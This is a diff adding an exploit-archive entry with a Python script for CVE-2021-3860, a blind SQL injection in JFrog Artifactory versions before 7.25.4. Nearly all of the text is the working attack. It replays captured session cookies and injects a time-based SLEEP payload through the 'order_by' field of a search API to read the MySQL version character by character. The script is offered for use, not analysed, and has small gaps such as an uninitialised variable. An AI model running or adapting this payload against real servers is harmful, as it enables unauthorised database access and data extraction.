@@ -1,0 +1,55 @@
+id: 39343
+date: 02/19/2024
+title: JFrog Artifactory < 7.25.4 - Blind SQL Injection Exploit
+author: ardr
+cves: 
+
+# Exploit Title: artifactory low-privileged blind sql injection
+# Exploit Author: ardr
+# Vendor Homepage:https://jfrog.com/help/r/jfrog-release-information/cve-2021-3860-artifactory-low-privileged-blind-sql-injection
+# Software Link: https://jfrog.com/help/r/jfrog-release-information/cve-2021-3860-artifactory-low-privileged-blind-sql-injection
+# Version: JFrog Artifactory prior to 7.25.4
+# Tested on: MySQL
+# CVE : CVE-2021-3860
+
+import requests, string, time
+from sys import stdout,exit
+import warnings
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+# written by 75fc58fa86778461771d2ff7f68b28259e97ece9bf6cd8be227c70e6a6140314c97d3fdac30b290c6b10d3679c5ba890635a1ca6fa23c83481dfc1257cd062fd
+# old script for CVE-2021-3860
+# log into artifactory with any user.  there must be populated data in the system.  a fresh install will not work.
+# you will need to be able to capture a valid request to the below endpoint in order to run this script.
+# once captured, replace the cookies and headers below
+
+
+warnings.simplefilter('ignore',InsecureRequestWarning)
+
+
+session = requests.session()
+base = input("Please enter the base url: ")
+url = f"{base}/ui/api/v1/global-search/bundles/received?$no_spinner=true"
+# headers = Replace this with captured headers from the above endpoint 
+pos = 1
+# cookies = Replace this with captured cookies from the above endpoint 
+
+
+while True:
+    for i in string.digits + '.':
+        data={"after": "", "before": "", "direction": "asc", "name": "*", "num_of_rows": 100, "order_by": f"(select*from(select((CASE WHEN (MID(VERSION(),{pos},1) = '{i}') THEN SLEEP(5) ELSE 4616 END)))a)"}
+        start = time.time()
+        r = session.post(url, headers=headers, cookies=cookies, json=data, verify=False)
+        request_time = time.time() - start
+        if request_time > 5:
+            version += i
+            pos += 1
+            stdout.write(i)
+            stdout.flush()
+            break
+        if len(version) >= 6:
+            stdout.write("\n")
+            print(f"Version found: MySQL {version}")
+            exit(0)
+
+#  0day.today [2024-02-22]  #
